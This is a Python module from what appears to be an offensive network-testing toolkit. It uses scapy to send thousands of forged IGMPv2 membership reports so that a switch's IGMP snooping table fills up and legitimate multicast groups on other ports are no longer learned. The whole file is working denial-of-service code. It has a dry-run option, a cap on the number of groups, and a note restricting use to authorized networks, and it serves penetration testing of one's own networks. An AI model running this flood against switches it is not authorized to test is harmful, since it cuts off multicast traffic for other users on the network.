"""IGMP snooping table exhaustion: fill a snooping switch's group table with reports for many groups.

A snooping switch keeps one entry per (group, port) it has learned from membership reports. The
table has a fixed size. Reports are not authenticated, so one port can send a report for many
groups and use up the table. When the table is full, the switch cannot learn a legitimate group
from another port, and that port's traffic for the group is not forwarded to it.

This module sends one IGMPv2 membership report for each group in a contiguous range, from the
operator's MAC, with the same format as the IGMP spoofing module. Groups are taken from
239.0.0.0/8 (administratively scoped), outside the local control range.

The effect to measure is whether a legitimate group from another port is still learned after the
flood. Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import sendp
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac
from macabre.attacks.igmp_spoofing import build_report, validate_group

MAX_GROUPS = 8192
SCOPE_NET = ipaddress.IPv4Network("239.0.0.0/8")


def group_range(base_group: str, count: int) -> tuple[str, ...]:
    """`count` consecutive groups starting at base_group. Refuses ranges that leave 239.0.0.0/8."""
    base = ipaddress.IPv4Address(validate_group(base_group))
    if base not in SCOPE_NET:
        raise ValueError(f"Base group {base_group} must be inside 239.0.0.0/8.")
    last = base + (count - 1)
    if last not in SCOPE_NET:
        raise ValueError(f"The range from {base_group} for {count} groups leaves 239.0.0.0/8.")
    return tuple(str(base + offset) for offset in range(count))


@dataclass(frozen=True)
class IgmpSnoopingExhaustionConfig:
    iface: str                          # attacker interface, on the segment with the switch
    source_mac: str                     # the sender's MAC (required)
    base_group: str = "239.100.0.1"     # first group of the range
    count: int = 4200                   # number of groups, one report each
    source_ip: str = "0.0.0.0"          # the sender's IP; 0.0.0.0 for an unnumbered host
    dry_run: bool = False               # build reports but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        try:
            ipaddress.IPv4Address(self.source_ip)
        except ValueError as exc:
            raise ValueError("Source address must be an IPv4 address (or 0.0.0.0).") from exc
        if not 1 <= self.count <= MAX_GROUPS:
            raise ValueError(f"Number of groups must be between 1 and {MAX_GROUPS}.")
        group_range(self.base_group, self.count)  # raises if the range is not valid


@dataclass
class IgmpSnoopingExhaustionStats:
    reports: int = 0
    status: str = ""


def build_flood(config: IgmpSnoopingExhaustionConfig) -> list[Packet]:
    """One report per group in the range, in order."""
    return [build_report(config.source_mac, config.source_ip, g) for g in group_range(config.base_group, config.count)]


def run_igmp_snooping_exhaustion(
    config: IgmpSnoopingExhaustionConfig,
    stop_event: threading.Event,
    on_progress: Callable[[IgmpSnoopingExhaustionStats], None],
    send: Callable[..., Any] | None = None,
) -> IgmpSnoopingExhaustionStats:
    """Send one report per group in the range, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        stats = IgmpSnoopingExhaustionStats(
            status=(
                f"Dry run: would send {config.count} IGMP membership report(s), one per group from "
                f"{config.base_group}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = IgmpSnoopingExhaustionStats()
    for frame in build_flood(config):
        if stop_event.is_set():
            stats.status = f"Stopped after {stats.reports} report(s)."
            return stats
        send(frame, iface=config.iface, verbose=False)
        stats.reports += 1
        if stats.reports % 100 == 0:
            on_progress(replace(stats))
    on_progress(replace(stats))
    return stats
